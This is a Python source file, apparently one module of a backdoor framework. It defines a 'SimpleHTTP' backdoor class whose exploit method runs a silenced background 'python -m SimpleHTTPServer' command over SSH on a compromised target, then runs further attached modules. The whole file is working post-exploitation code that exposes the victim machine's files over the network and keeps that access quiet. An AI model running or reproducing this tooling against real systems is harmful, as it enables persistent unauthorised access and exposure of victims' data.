from backdoors.backdoor import *

class SimpleHTTP(Backdoor):
    prompt = Fore.RED + "(SimpleHTTP) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using simple http auxiliary..."
        self.core = core
        self.options = {
                "port": Option("port", "8000", "port to serve up SimpleHTTPServer", False),
                }
        self.allow_modules = True
        self.modules = {}
        self.help_text = INFO + "Starts python's SimpleHTTP server on the client."

    def get_command(self):
        return ("nohup python -m SimpleHTTPServer %s &> /dev/null &" % self.get_value("port"))
    
    def do_exploit(self, args):
        target = self.core.curtarget
        print(GOOD + "Starting web server....")
        target.ssh.exec_command(self.get_command())
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit(self)

